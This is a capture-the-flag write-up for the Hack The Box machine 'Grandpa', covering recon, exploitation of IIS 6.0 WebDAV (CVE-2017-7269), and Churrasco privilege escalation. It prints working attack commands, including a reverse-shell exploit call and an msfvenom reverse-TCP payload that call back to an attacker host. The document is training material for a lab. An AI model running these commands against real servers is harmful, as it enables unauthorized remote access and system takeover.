# Grandpa Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -T4 -p- -sV -oA fullgrandpa 10.10.10.14``

![image](https://user-images.githubusercontent.com/123066149/221123940-c6cf766e-2cef-4e2b-a2c3-e32af2f1e96c.png)

### On this only the port 80 is open there is an ISS 6.0 and WEBDAV  :

``nmap -sC -sV -oA grandpa 10.10.10.14 -T4``

![image](https://user-images.githubusercontent.com/123066149/221124410-19da52ac-a55f-4530-9db3-55fdcc355cc3.png)

# ${{\color{purple}Initial Foothold}}\ $

### The following methods are allowed :

``Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK``

### The right way here is : iis 6.0 and the PROFIND method which is active

![image](https://user-images.githubusercontent.com/123066149/221125371-2ee1ce5c-5897-44f6-a561-96e7de8a1ee3.png)

![image](https://user-images.githubusercontent.com/123066149/221125507-bac221ed-0bac-47b2-a433-b08cd7a080b2.png)

### So I will move on to the exploitation of this buffer :

# ${{\color{purple}Exploitation}}\ $

### I used this exploit :

https://github.com/k4u5h41/CVE-2017-7269

``python2.7 ii6_reverse_shell.py 10.10.10.14 80 10.10.16.5 4444``

![image](https://user-images.githubusercontent.com/123066149/221126503-b6339b87-a15f-4a0c-a76a-c4f18efd788c.png)

![image](https://user-images.githubusercontent.com/123066149/221126601-53615812-d97e-4f08-879c-7b5f2db13a22.png)

# ${{\color{purple}Privilege Escalation}}\ $

![image](https://user-images.githubusercontent.com/123066149/221126796-38030014-f695-4f30-b8b4-61c86cf63679.png)

``SEImpersonalPrivilege``
### Is one I know to look out for modern boxes, that means a potato exploit (juicy, lonely, rotten). But for 2003, 
### It’s better to start with kernel exploit :

``python windows-exploit-suggester.py -d 2023-02-18-mssb.xls -i ../sysinfo.txt > vuln.txt``

![image](https://user-images.githubusercontent.com/123066149/221127842-8284e835-646b-47a9-934c-bdc25f4314eb.png)

### I had a choice but I used e``Churraskito.exee`` / ``churrasco.exe``

https://github.com/Re4son/Churrasco/

``copy \\10.10.16.5\kali\Churraskito.exe`` 

``Churraskito.exe "C:\Windows\system32\cmd.exe" "whoami"``

![image](https://user-images.githubusercontent.com/123066149/221128486-dcde9079-e41c-40ea-871b-c35488e243d8.png)

``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=8888 -f exe -o exploit.exe``

``Churraskito.exe "C:\Windows\system32\cmd.exe" "C:\wmpub\exploit.exe"``

![image](https://user-images.githubusercontent.com/123066149/221128707-7440e4e1-8041-4a31-b9a2-a69fdc243a11.png)

# ${{\color{purple}Points of Improvement}}\ $
